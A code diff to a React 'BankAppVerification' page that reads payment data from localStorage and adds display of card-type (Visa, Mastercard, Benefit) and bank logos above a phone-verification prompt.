@@ -13,7 +13,21 @@ export default function BankAppVerification() {
 
   // Get payment data from localStorage
   const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
-  const totalAmount = paymentData.totalAmount || localStorage.getItem("Total") || "0.000";
+  const totalAmount = paymentData.totalPaid || localStorage.getItem("Total") || "0.000";
+  const bankName = paymentData.bankName || "";
+  const bankLogo = paymentData.bankLogo || "";
+  const cardType = paymentData.cardType || "";
+
+  // Determine card type logo
+  const getCardTypeLogo = () => {
+    const type = cardType.toLowerCase();
+    if (type === 'visa') return '/images/visa.png';
+    if (type === 'mastercard') return '/images/mastercard.png';
+    if (type === 'benefit' || type === 'debit') return '/benefit-logo.png';
+    return '';
+  };
+
+  const cardTypeLogo = getCardTypeLogo();
 
   // Emit page enter
   useEffect(() => {
@@ -56,6 +70,30 @@ export default function BankAppVerification() {
   return (
     <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
       <div className="bg-white rounded-2xl shadow-xl p-6 max-w-md mx-auto w-full">
+        {/* Bank Logo and Card Type */}
+        <div className="flex justify-between items-center mb-6 px-4">
+          {/* Card Type Logo (Visa/Mastercard/Benefit) */}
+          {cardTypeLogo && (
+            <div className="flex items-center" style={{ width: '80px', height: '30px' }}>
+              <img
+                src={cardTypeLogo}
+                alt={cardType || 'Card'}
+                style={{ maxWidth: '80px', maxHeight: '30px', objectFit: 'contain' }}
+              />
+            </div>
+          )}
+          {/* Bank Logo */}
+          {bankLogo && (
+            <div className="flex items-center" style={{ width: '80px', height: '30px' }}>
+              <img
+                src={bankLogo}
+                alt={bankName || "Bank"}
+                style={{ maxWidth: '80px', maxHeight: '30px', objectFit: 'contain' }}
+              />
+            </div>
+          )}
+        </div>
+
         {/* Phone Icon - Professional Design */}
         <div className="flex justify-center mb-5">
           <div className="relative">
